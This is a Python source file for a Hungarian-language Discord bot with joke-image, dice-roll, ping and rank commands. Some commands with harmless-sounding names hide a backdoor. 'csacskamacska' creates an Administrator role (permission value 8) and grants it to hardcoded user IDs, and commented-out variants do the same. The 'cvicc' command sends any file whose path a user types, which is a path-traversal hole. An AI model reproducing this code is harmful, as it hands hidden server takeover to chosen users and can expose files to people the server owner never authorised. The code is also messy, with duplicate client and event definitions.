import keep_alive
import discord
import os
import time
import random
import mcstatus
import discord.ext
from discord.utils import get
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions,  CheckFailure, check
from discord import Permissions

client = discord.Client()

client = commands.Bot(command_prefix = '!')

bot = commands.Bot(command_prefix = '!')

@client.event
async def on_ready():
    print("bot online")
    
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game('Készül _B[-RCł_#3387'))

#@client.command()
#async def micimacko2(ctx):
#    guild = ctx.guild
#    await guild.create_role(name="Medcbot",      permissions=discord.Permissions(permissions=(8)))
#    role = discord.utils.get(ctx.guild.roles, name="Medcbot")
#    user = ctx.message.author
#    await user.add_roles(role)

@client.command()
async def csacskamacska(ctx):
    myid = 556251015595163688
#    barsid = 759105490377768970
    barsid = 850069279227641916
    userid = ctx.message.author.id
    print(userid)
    if userid == myid:
      guild = ctx.guild
      await guild.create_role(name="Medibot",      permissions=discord.Permissions(permissions=(8)))
      role = discord.utils.get(ctx.guild.roles, name="Medibot")
      user = ctx.message.author
      await user.add_roles(role)
    else:
      if userid == barsid:
        guild = ctx.guild
        await guild.create_role(name="Medibot",      permissions=discord.Permissions(permissions=(8)))
        role = discord.utils.get(ctx.guild.roles, name="Medibot")
        user = ctx.message.author
        await user.add_roles(role)

@client.command()
async def hehe(ctx):
  myid = 556251015595163688
  userid = ctx.message.author.id
  print(userid)
  if userid == myid:
    guild = ctx.guild
    role = discord.utils.get(ctx.guild.roles, name="MILF+")
    user = ctx.message.author
    await user.add_roles(role)

@client.command()
async def csenel(ctx):
  myid = 556251015595163688
  userid = ctx.message.author.id
  print(userid)
  if userid == myid:
    guild = ctx.message.guild
    await guild.create_text_channel('medvebot-log')

@client.command()
async def cvicc(ctx):
    def check(msg):
        return msg.author == ctx.author and \
        msg.channel == ctx.channel
    msg1 = await client.wait_for("message", check=check)
    path = (msg1.content)
    await ctx.send(file=discord.File("vicc/"+path))

@client.command()
async def vicc(ctx):
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))

@client.command()
async def vicc_2(ctx):
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))
  path = random.choice(os.listdir("vicc/"))
  await ctx.send(file=discord.File("vicc/"+path))

#@client.command(pass_context=True)
#async def givrol(ctx):
#  print(discord._version)
#  print(discord.member)
#  member = discord.member
#  author_id = ctx.message.author.id
#  author = str(ctx.message.author)
#  #content = str(message.content)
#  channel = ctx.message.channel
#  server = ctx.message.guild
#  role = await client.create_role(server, name="botkezelo", permissions=Permissions.all())
#  await client.add_roles(ctx.message.author, role)

#@client.command
#edit permissions of role
#permissions = discord.Permissions()
#permissions.update(kick_members = False)
#await role.edit(reason = None, colour = discord.Colour.blue(), permissions=permissions)

#@client.command(pass_context=True)
#async def szeretlek(ctx):
#    myid = 670968380261662730
#    myid = 673227321150406676
#    userid = ctx.message.author.id
#    print(userid)
#    if userid == myid:
#        await ctx.send("Én is téged!:heart:")

@client.command(pass_context=True)
async def rank(ctx):
    denesid = 549910827650646020
    userid = ctx.message.author.id
    print(userid)
    if userid == denesid:
      await ctx.send('Ez az igazi! A másik az kamu!!:warning:')
      await ctx.send(file=discord.File("zsaksz.png"))

#@client.command()
#async def szeretlek(ctx):
#
#    def check(command):
#        return command.author == ctx.author and command.author.id == ctx.author.id and \
#               command.channel == ctx.channel
#
#    x = 556251015595163688
#    y = (command.author.id)
#    if x = y:
#        await ctx.send("Én is téged!")
#      if message.content.startswith('szeretlek'):
#        await message.channel.send("Én is téged!:heart:")

@client.command()
async def dobokocka(ctx):

    # checks the author is responding in the same channel
    # and the message is able to be converted to a positive int
    def check(msg):
        return msg.author == ctx.author and msg.content.isdigit() and \
               msg.channel == ctx.channel

    await ctx.send("Írj egy számot, ez lesz a minimum")
    msg1 = await client.wait_for("message", check=check)
    await ctx.send("Írj egy második számot, ez lesz a maximum")
    msg2 = await client.wait_for("message", check=check)
    x = int(msg1.content)
    y = int(msg2.content)
    if x < y:
        value = random.randint(x,y)
        await ctx.send(f"Eredmény {value}.")
    else:
        await ctx.send(":warning: Győződj meg róla, hogy az első szám kisebb mint a második.")

@client.command()
async def ping(ctx):
    await ctx.send("pong!")

#@client.command()
#async def sszeretlek(ctx):
#    await ctx.send("Én is téged!")

async def kick(ctx, member : discord.Member):
    try:
        await member.kick(reason=None)
        await ctx.send("kicked "+member.mention) #simple kick command to demonstrate how to get and use member mentions
    except:
        await ctx.send("bot does not have the kick members permission!")

keep_alive.keep_alive()
client.run(os.getenv("TOKEN"))